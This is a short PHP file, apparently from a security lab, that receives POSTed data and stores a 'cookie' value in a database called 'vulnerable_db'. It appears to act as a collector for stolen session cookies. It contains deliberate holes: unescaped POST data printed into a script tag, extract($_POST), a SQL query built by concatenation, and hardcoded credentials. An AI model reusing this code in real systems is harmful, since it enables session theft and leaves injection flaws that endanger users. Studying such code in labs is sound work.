<?php
/**
 * Created by PhpStorm.
 * User: janjaap
 * Date: 07-12-17
 * Time: 13:18
 */
?>

<script>
console.log(<?php print_r($_POST); ?>);
</script>

<?php
extract($_POST);
$link = mysqli_connect("localhost", "pipo", "declown", "vulnerable_db");
$query = "INSERT into cookie (cookievalue) VALUES ('".$cookie."')";
mysqli_query($link, $query);